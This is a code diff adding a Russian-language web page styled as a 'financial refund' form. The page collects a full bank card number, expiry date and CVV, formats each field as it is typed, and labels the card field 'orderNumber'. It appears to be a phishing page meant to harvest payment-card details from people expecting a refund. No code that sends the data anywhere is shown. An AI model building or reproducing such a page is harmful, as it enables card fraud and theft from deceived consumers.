@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Финансовый возврат</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 400px;
+      margin: 40px auto;
+      padding: 20px;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+    h2 {
+      text-align: center;
+      color: #a000c8;
+    }
+    input, select, textarea, button {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    .row {
+      display: flex;
+      gap: 10px;
+      width: 100%;
+    }
+    .row input {
+      flex: 1 1 0;
+      box-sizing: border-box;
+    }
+    button {
+      background: #a000c8;
+      color: white;
+      font-size: 18px;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #8a00a8;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Финансовый возврат</h2>
+    <form>
+      <input type="tel" id="orderNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
+      
+      <div class="row">
+        <input type="tel" id="expiry" placeholder="00 / 00" maxlength="7" inputmode="numeric" required>
+        <input type="tel" id="cvv" placeholder="000" maxlength="3" inputmode="numeric" required>
+      </div>
+      
+      <select required>
+        <option value="" disabled selected>Причина возврата</option>
+        <option value="defect">Дефект</option>
+        <option value="wrong">Неверный товар</option>
+        <option value="other">Другое</option>
+      </select>
+      
+      <textarea placeholder="Комментарий (по желанию)"></textarea>
+      <button type="submit">Отправить запрос</button>
+    </form>
+  </div>
+
+  <script>
+    // Маска для номера карты (группировка по 4 цифры)
+    const cardInput = document.getElementById('orderNumber');
+    const expiryInput = document.getElementById('expiry');
+    const cvvInput = document.getElementById('cvv');
+
+    cardInput.addEventListener('input', (e) => {
+      let value = e.target.value.replace(/\D/g, ''); // только цифры
+      value = value.slice(0,16); // максимум 16 цифр
+      const parts = value.match(/.{1,4}/g);
+      e.target.value = parts ? parts.join(' ') : '';
+
+      // автофокус на expiry после 16 цифр
+      if (value.length === 16) {
+        expiryInput.focus();
+      }
+    });
+
+    // Маска для "MM / YY"
+    expiryInput.addEventListener('input', (e) => {
+      let value = e.target.value.replace(/\D/g, ''); // убираем всё кроме цифр
+      if (value.length > 4) value = value.slice(0,4); // максимум 4 цифры
+
+      if (value.length > 2) {
+        e.target.value = value.slice(0,2) + " / " + value.slice(2);
+      } else {
+        e.target.value = value;
+      }
+
+      // автофокус на CVV после 4 цифр
+      if (value.length === 4) {
+        cvvInput.focus();
+      }
+    });
+
+    // Ограничение только цифрами для CVV
+    cvvInput.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
+    });
+  </script>
+</body>
+</html>
